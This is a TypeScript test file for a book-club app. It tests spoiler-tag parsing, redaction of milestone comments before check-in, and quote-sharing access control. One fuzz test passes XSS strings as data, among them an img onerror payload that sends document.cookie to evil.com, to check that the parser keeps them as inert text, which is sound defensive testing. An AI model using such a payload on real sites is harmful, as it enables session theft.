import { describe, expect, it } from "bun:test";
import { parseSpoilerTokens, hasSpoilerTokens } from "@/components/spoiler-text";
import { filterMilestoneCommentsForViewer } from "@/lib/schedules";
import {
  canUserViewQuote,
  canUserDeleteQuote,
  filterQuotesForViewer,
} from "@/lib/marginalia";
import type { MilestoneCommentsResponse, UsersResponse } from "@/types/pocketbase-types";

describe("Adversarial Test Suite 1: Spoilers, Marginalia & Milestone Privacy", () => {
  describe("Fuzzing parseSpoilerTokens & hasSpoilerTokens", () => {
    it("handles empty, whitespace, and nullish strings without crashing", () => {
      expect(parseSpoilerTokens("")).toEqual([]);
      expect(parseSpoilerTokens("   ")).toEqual([{ type: "text", content: "   " }]);
      expect(parseSpoilerTokens(null as unknown as string)).toEqual([]);
      expect(parseSpoilerTokens(undefined as unknown as string)).toEqual([]);

      expect(hasSpoilerTokens("")).toBe(false);
      expect(hasSpoilerTokens("   ")).toBe(false);
      expect(hasSpoilerTokens(null as unknown as string)).toBe(false);
      expect(hasSpoilerTokens(undefined as unknown as string)).toBe(false);
    });

    it("parses empty spoiler tags and whitespace spoiler tags safely", () => {
      const emptySpoiler = parseSpoilerTokens("||||");
      expect(emptySpoiler).toEqual([{ type: "spoiler", content: "" }]);

      const spaceSpoiler = parseSpoilerTokens("|| ||");
      expect(spaceSpoiler).toEqual([{ type: "spoiler", content: " " }]);
      expect(hasSpoilerTokens("|| ||")).toBe(true);
    });

    it("handles triple pipes and asymmetric pipe delimiters", () => {
      // "|||abc|||" -> "|||abc||" + "|" -> spoiler with "|abc" + text "|"
      const tokens = parseSpoilerTokens("|||abc|||");
      expect(tokens).toEqual([
        { type: "spoiler", content: "|abc" },
        { type: "text", content: "|" },
      ]);
    });

    it("handles consecutive and adjacent spoiler tokens", () => {
      const adjacent = parseSpoilerTokens("||a||b||c||");
      expect(adjacent).toEqual([
        { type: "spoiler", content: "a" },
        { type: "text", content: "b" },
        { type: "spoiler", content: "c" },
      ]);

      const touching = parseSpoilerTokens("||first||||second||");
      expect(touching).toEqual([
        { type: "spoiler", content: "first" },
        { type: "spoiler", content: "second" },
      ]);
    });

    it("handles multiline spoiler tokens across multiple paragraph breaks", () => {
      const multiline = "||This is line 1\n\nAnd line 2 with *formatting*||";
      const tokens = parseSpoilerTokens(multiline);
      expect(tokens).toEqual([
        {
          type: "spoiler",
          content: "This is line 1\n\nAnd line 2 with *formatting*",
        },
      ]);
      expect(hasSpoilerTokens(multiline)).toBe(true);
    });

    it("handles massive 10,000-character unclosed spoiler tag without hanging or ReDoS", () => {
      const longText = "||" + "A".repeat(10000);
      const start = performance.now();
      const tokens = parseSpoilerTokens(longText);
      const duration = performance.now() - start;

      expect(duration).toBeLessThan(100); // Must be sub-100ms
      expect(tokens).toEqual([{ type: "text", content: longText }]);
      expect(hasSpoilerTokens(longText)).toBe(false);
    });

    it("handles 500 consecutive spoiler token pairs at scale", () => {
      const chunk = "||spoiler||";
      const input = chunk.repeat(500);

      const start = performance.now();
      const tokens = parseSpoilerTokens(input);
      const duration = performance.now() - start;

      expect(duration).toBeLessThan(150);
      expect(tokens).toHaveLength(500);
      expect(tokens.every((t) => t.type === "spoiler" && t.content === "spoiler")).toBe(true);
    });

    it("handles 1000 raw pipe delimiters without catastrophic backtracking", () => {
      const rawPipes = "|".repeat(1000);
      const tokens = parseSpoilerTokens(rawPipes);
      // 1000 pipes = 250 pairs of "||||" -> 250 empty spoilers
      expect(tokens).toHaveLength(250);
      expect(tokens.every((t) => t.type === "spoiler" && t.content === "")).toBe(true);
    });

    it("preserves XSS payloads, HTML tags, and Zalgo unicode cleanly without execution or truncation", () => {
      const xssScript = "||<script>alert('pwned')</script>||";
      expect(parseSpoilerTokens(xssScript)).toEqual([
        { type: "spoiler", content: "<script>alert('pwned')</script>" },
      ]);

      const xssImg = "||<img src=x onerror=\"fetch('http://evil.com/'+document.cookie)\">||";
      expect(parseSpoilerTokens(xssImg)).toEqual([
        {
          type: "spoiler",
          content: "<img src=x onerror=\"fetch('http://evil.com/'+document.cookie)\">",
        },
      ]);

      const zalgo = "||H̸̍̂e̷̔͗ĺ̸͌l̷̄̈o̴̍̋ ̸̌̅W̷̊̐o̴̍̔r̸͊͒l̴̋̈d̴̂͑||";
      const zalgoTokens = parseSpoilerTokens(zalgo);
      expect(zalgoTokens).toEqual([
        {
          type: "spoiler",
          content: "H̸̍̂e̷̔͗ĺ̸͌l̷̄̈o̴̍̋ ̸̌̅W̷̊̐o̴̍̔r̸͊͒l̴̋̈d̴̂͑",
        },
      ]);

      const bidiAndEmoji = "||🔥🚀\u202Ereversed\u202C🎉||";
      const bidiTokens = parseSpoilerTokens(bidiAndEmoji);
      expect(bidiTokens).toEqual([
        {
          type: "spoiler",
          content: "🔥🚀\u202Ereversed\u202C🎉",
        },
      ]);
    });
  });

  describe("Adversarial Testing: filterMilestoneCommentsForViewer Privacy & Redaction", () => {
    const mockComments = [
      {
        id: "c1",
        milestone: "m1",
        user: "u1",
        group: "g1",
        content: "Major plot spoiler: The protagonist was the ghost all along!",
        isSpoiler: true,
        createdAt: "2026-08-18 10:00:00.000Z",
        collectionId: "milestone_comments",
        collectionName: "milestone_comments",
        expand: {
          user: {
            id: "u1",
            name: "Alice",
            email: "alice@secret-domain.corp",
            avatarUrl: "https://avatar.com/alice.png",
            collectionId: "users",
            collectionName: "users",
            username: "alice",
            emailVisibility: false,
            verified: true,
          },
        },
      },
      {
        id: "c2",
        milestone: "m1",
        user: "u2",
        group: "g1",
        content: "I really enjoyed chapter 4 pacing.",
        isSpoiler: false,
        createdAt: "2026-08-18 11:00:00.000Z",
        collectionId: "milestone_comments",
        collectionName: "milestone_comments",
        expand: {
          user: {
            id: "u2",
            name: "Bob",
            email: "bob@private.org",
            avatarUrl: "https://avatar.com/bob.png",
            collectionId: "users",
            collectionName: "users",
            username: "bob",
            emailVisibility: false,
            verified: true,
          },
        },
      },
    ] as unknown as MilestoneCommentsResponse<{ user?: UsersResponse }>[];

    it("NEVER leaks comment bodies or sensitive emails when viewer has NOT checked in", () => {
      const result = filterMilestoneCommentsForViewer(mockComments, false);

      expect(result.isLocked).toBe(true);
      expect(result.hasCheckedIn).toBe(false);
      expect(result.lockedCount).toBe(2);
      expect(result.comments).toHaveLength(2);

      for (const comment of result.comments) {
        // Comment content MUST be completely undefined (never string or empty string)
        expect(comment.content).toBeUndefined();
        expect(comment.isLocked).toBe(true);
        // Author email MUST NOT be leaked in locked preview
        expect(comment.author?.email).toBeUndefined();
        // Author name and avatar can be visible for placeholder avatars
        expect(comment.author?.name).toBeDefined();
      }

      // Deep string search to ensure no secret spoiler text leaked anywhere in the JSON
      const serialized = JSON.stringify(result);
      expect(serialized.includes("The protagonist was the ghost all along")).toBe(false);
      expect(serialized.includes("alice@secret-domain.corp")).toBe(false);
      expect(serialized.includes("bob@private.org")).toBe(false);
    });

    it("exposes full comments and author details when viewer HAS checked in", () => {
      const result = filterMilestoneCommentsForViewer(mockComments, true);

      expect(result.isLocked).toBe(false);
      expect(result.hasCheckedIn).toBe(true);
      expect(result.lockedCount).toBe(0);
      expect(result.comments).toHaveLength(2);

      expect(result.comments[0].content).toBe(
        "Major plot spoiler: The protagonist was the ghost all along!",
      );
      expect(result.comments[0].isSpoiler).toBe(true);
      expect(result.comments[0].isLocked).toBe(false);
      expect(result.comments[0].author?.email).toBe("alice@secret-domain.corp");

      expect(result.comments[1].content).toBe("I really enjoyed chapter 4 pacing.");
      expect(result.comments[1].isSpoiler).toBe(false);
      expect(result.comments[1].isLocked).toBe(false);
    });

    it("handles empty comment lists safely for both checked-in and pre-checkin viewers", () => {
      const emptyLocked = filterMilestoneCommentsForViewer([], false);
      expect(emptyLocked).toEqual({
        comments: [],
        isLocked: true,
        lockedCount: 0,
        hasCheckedIn: false,
      });

      const emptyUnlocked = filterMilestoneCommentsForViewer([], true);
      expect(emptyUnlocked).toEqual({
        comments: [],
        isLocked: false,
        lockedCount: 0,
        hasCheckedIn: true,
      });
    });

    it("safely tolerates nullish or malformed input without crashing", () => {
      const resNull = filterMilestoneCommentsForViewer(null as unknown as [], false);
      expect(resNull.comments).toEqual([]);
      expect(resNull.lockedCount).toBe(0);

      const resUndef = filterMilestoneCommentsForViewer(undefined as unknown as [], true);
      expect(resUndef.comments).toEqual([]);
    });

    it("handles comments missing author/expand data gracefully", () => {
      const headlessComment = [
        {
          id: "c_headless",
          milestone: "m1",
          user: "u_orphan",
          group: "g1",
          content: "Orphan comment without user expand",
          isSpoiler: false,
          createdAt: "2026-08-18 12:00:00.000Z",
          collectionId: "milestone_comments",
          collectionName: "milestone_comments",
        },
      ] as unknown as MilestoneCommentsResponse<{ user?: UsersResponse }>[];

      const lockedRes = filterMilestoneCommentsForViewer(headlessComment, false);
      expect(lockedRes.comments[0].author).toBeUndefined();
      expect(lockedRes.comments[0].content).toBeUndefined();

      const unlockedRes = filterMilestoneCommentsForViewer(headlessComment, true);
      expect(unlockedRes.comments[0].author).toBeUndefined();
      expect(unlockedRes.comments[0].content).toBe("Orphan comment without user expand");
    });
  });

  describe("Adversarial Testing: Quotes Access Control & Cross-Tenant Isolation", () => {
    const privateQuote = {
      id: "q_private",
      user: "user_owner",
      quoteText: "Private journal entry",
      isSharedWithCircles: [],
    };

    const sharedQuoteAlpha = {
      id: "q_alpha",
      user: "user_owner",
      quoteText: "Shared only with Circle Alpha",
      isSharedWithCircles: ["circle_alpha"],
    };

    const multiSharedQuote = {
      id: "q_multi",
      user: "user_alice",
      quoteText: "Shared with Alpha and Beta",
      isSharedWithCircles: ["circle_alpha", "circle_beta"],
    };

    describe("Cross-tenant reading via canUserViewQuote & filterQuotesForViewer", () => {
      it("allows quote owner to always view their own quotes regardless of sharing settings", () => {
        expect(canUserViewQuote(privateQuote, "user_owner", [])).toBe(true);
        expect(canUserViewQuote(sharedQuoteAlpha, "user_owner", [])).toBe(true);
        expect(canUserViewQuote(multiSharedQuote, "user_alice", [])).toBe(true);
      });

      it("denies access to a stranger when quote is private (not shared with circles)", () => {
        expect(canUserViewQuote(privateQuote, "stranger_user", ["circle_alpha", "circle_beta"])).toBe(false);
      });

      it("denies access when viewer is not a member of the shared circle (tenant boundary)", () => {
        // Attacker belongs to circle_gamma, trying to view quote shared with circle_alpha
        expect(
          canUserViewQuote(sharedQuoteAlpha, "attacker_user", ["circle_gamma", "circle_delta"]),
        ).toBe(false);
      });

      it("allows access when viewer belongs to one of the authorized circles", () => {
        expect(canUserViewQuote(sharedQuoteAlpha, "circle_member", ["circle_alpha"])).toBe(true);
        expect(canUserViewQuote(multiSharedQuote, "circle_member", ["circle_beta"])).toBe(true);
      });

      it("rejects view requests with empty, null, or malformed viewer IDs", () => {
        expect(canUserViewQuote(sharedQuoteAlpha, "", ["circle_alpha"])).toBe(false);
        expect(canUserViewQuote(sharedQuoteAlpha, null as unknown as string, ["circle_alpha"])).toBe(false);
        expect(canUserViewQuote(sharedQuoteAlpha, undefined as unknown as string, ["circle_alpha"])).toBe(false);
      });

      it("safely filters mixed collections without throwing on malformed or null records", () => {
        const pool = [
          privateQuote,
          sharedQuoteAlpha,
          multiSharedQuote,
          null as unknown as typeof privateQuote,
          { id: "q_malformed", user: "u_x", isSharedWithCircles: null },
          { id: "q_corrupt", user: "u_y", isSharedWithCircles: "not-an-array" as unknown as string[] },
        ];

        // Stranger with membership in circle_beta
        const visibleToBetaMember = filterQuotesForViewer(pool, "stranger_beta_user", ["circle_beta"]);
        expect(visibleToBetaMember.map((q) => q.id)).toEqual(["q_multi"]);

        // Owner viewing the pool
        const visibleToOwner = filterQuotesForViewer(pool, "user_owner", []);
        expect(visibleToOwner.map((q) => q.id)).toEqual(["q_private", "q_alpha"]);
      });

      it("handles null and empty arrays in filterQuotesForViewer", () => {
        expect(filterQuotesForViewer([], "user_1", ["circle_1"])).toEqual([]);
        expect(filterQuotesForViewer(null as unknown as [], "user_1", ["circle_1"])).toEqual([]);
      });
    });

    describe("Authorization Matrix for Quote Deletion via canUserDeleteQuote", () => {
      const quote = { id: "q_1", user: "author_42" };

      it("authorizes the author to delete their own quote", () => {
        expect(canUserDeleteQuote(quote, { id: "author_42", isAdmin: false })).toBe(true);
      });

      it("authorizes system admin to delete any quote", () => {
        expect(canUserDeleteQuote(quote, { id: "admin_super", isAdmin: true })).toBe(true);
      });

      it("denies another normal circle member from deleting the quote", () => {
        expect(canUserDeleteQuote(quote, { id: "member_99", isAdmin: false })).toBe(false);
      });

      it("denies deletion when session is missing, unauthenticated, or malformed", () => {
        expect(canUserDeleteQuote(quote, null)).toBe(false);
        expect(canUserDeleteQuote(quote, undefined)).toBe(false);
        expect(canUserDeleteQuote(quote, { id: "" })).toBe(false);
        expect(canUserDeleteQuote(null as unknown as typeof quote, { id: "author_42" })).toBe(false);
      });
    });
  });
});
